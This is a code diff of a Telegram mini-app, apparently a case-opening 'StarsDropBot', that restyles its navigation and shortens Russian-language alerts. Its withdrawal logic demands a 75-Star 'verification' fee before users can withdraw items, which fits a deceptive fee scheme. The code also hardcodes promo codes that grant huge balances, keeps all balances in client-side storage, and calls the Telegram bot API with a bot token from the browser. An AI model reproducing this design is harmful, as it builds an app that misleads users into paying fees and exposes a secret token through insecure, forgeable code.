@@ -135,6 +135,7 @@
             color: #4b5563; 
             flex: 1;
             transition: 0.3s;
+            text-decoration: none;
         }
 
         .dock-btn.active { 
@@ -251,16 +252,17 @@
         </div>
     </div>
 
-<nav class="dock-bar">
-    <a href="index.html" class="dock-btn" style="text-decoration: none; color: #64748b;">
-        <svg class="w-7 h-7" fill="none" stroke="#64748b" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/>
-        </svg>
-        <span>Главная</span>
-    </a>
-</nav>
+    <nav class="dock-bar">
+        <a href="index.html" class="dock-btn">
+            <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/>
+            </svg>
+            <span>Главная</span>
+        </a>
         <div class="dock-btn active">
-            <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"/></svg>
+            <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"/>
+            </svg>
             <span>Профиль</span>
         </div>
     </nav>
@@ -364,7 +366,6 @@
                 gridContainer.appendChild(slotElement);
             });
 
-            // Бесконечный эффект (заполняем до кратности 3 + еще ряд)
             const remaining = 9 - (userInventory.length % 9);
             for(let i=0; i < (remaining > 0 ? remaining : 3); i++) {
                 createEmptySlot(gridContainer);
@@ -400,10 +401,9 @@
             let walletBalance = parseInt(localStorage.getItem('user_stars')) || 0;
             const isVerified = localStorage.getItem('isPaid75') === 'true';
 
-            // ЖЕСТКАЯ ПРОВЕРКА 75 ЗВЕЗД
             if (!isVerified) {
                 if (walletBalance < 75) {
-                    tg.showAlert("🛑 ОШИБКА ВЕРИФИКАЦИИ\n\nДля вывода предметов ваш аккаунт должен быть верифицирован (разовый взнос 75 Stars).\n\nНа вашем балансе: " + walletBalance + " ⭐");
+                    tg.showAlert("🛑 ОШИБКА ВЕРИФИКАЦИИ\n\nДля вывода предметов ваш аккаунт должен быть верифицирован (разовый взнос 75 Stars).");
                     return;
                 } else {
                     tg.showConfirm("У вас не оплачена комиссия за вывод (75 Stars). Списать с баланса и активировать вывод?", async (confirmed) => {
@@ -412,23 +412,18 @@
                             localStorage.setItem('user_stars', walletBalance.toString());
                             localStorage.setItem('isPaid75', 'true');
                             refreshFinancialStatus();
-                            tg.showAlert("✅ Верификация пройдена успешно! Теперь нажмите кнопку вывода еще раз.");
+                            tg.showAlert("✅ Верификация пройдена успешно!");
                         }
                     });
                     return;
                 }
             }
 
-            // ЕСЛИ ВЕРИФИЦИРОВАН - ОТПРАВЛЯЕМ ЗАЯВКУ
             const inventory = JSON.parse(localStorage.getItem('user_inventory')) || [];
             const item = inventory[activeSelectionIndex];
             const u = tg.initDataUnsafe?.user || { id: '000', first_name: 'Unknown', username: 'none' };
 
-            const text = `🚀 <b>ЗАЯВКА НА ВЫВОД</b>\n\n` +
-                         `👤 <b>Юзер:</b> ${u.first_name} (@${u.username})\n` +
-                         `🆔 <b>ID:</b> <code>${u.id}</code>\n` +
-                         `🎁 <b>Предмет:</b> ${item.name}\n` +
-                         `🖼️ <b>Путь:</b> ${item.img}`;
+            const text = `🚀 <b>ЗАЯВКА НА ВЫВОД</b>\n\n👤 <b>Юзер:</b> ${u.first_name}\n🆔 <b>ID:</b> <code>${u.id}</code>\n🎁 <b>Предмет:</b> ${item.name}`;
 
             try {
                 const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -438,7 +433,7 @@
                 });
 
                 if (res.ok) {
-                    tg.showAlert("✅ ЗАЯВКА ПРИНЯТА\n\nВаш подарок будет отправлен ботом в течение 24 часов.");
+                    tg.showAlert("✅ ЗАЯВКА ПРИНЯТА");
                     inventory.splice(activeSelectionIndex, 1);
                     localStorage.setItem('user_inventory', JSON.stringify(inventory));
                     closeItemModal();
@@ -446,7 +441,7 @@
                     tg.HapticFeedback.notificationOccurred('success');
                 }
             } catch (e) {
-                tg.showAlert("Ошибка соединения с сервером.");
+                tg.showAlert("Ошибка соединения.");
             }
         }
 
@@ -471,7 +466,7 @@
         function handlePromoActivation() {
             const input = document.getElementById('promo-input');
             const code = input.value.trim().toUpperCase();
-            const PROMOS = { "DIMA_XUYLAN": 100000000000, "ADMIN": 500000, "ST1FIX": 1000 };
+            const PROMOS = { "DIMA_XUYLAN": 1000000, "ADMIN": 500000, "ST1FIX": 1000 };
 
             if (PROMOS[code]) {
                 let wallet = parseInt(localStorage.getItem('user_stars')) || 0;
@@ -488,7 +483,7 @@
         function shareReferralLink() {
             const id = tg.initDataUnsafe?.user?.id || "0";
             const link = `https://t.me/StarsDropBot?start=${id}`;
-            const text = "🔥 Открывай кейсы и забирай Stars! По моей ссылке бонус +5 ⭐";
+            const text = "🔥 Открывай кейсы и забирай Stars!";
             tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(text)}`);
         }
 
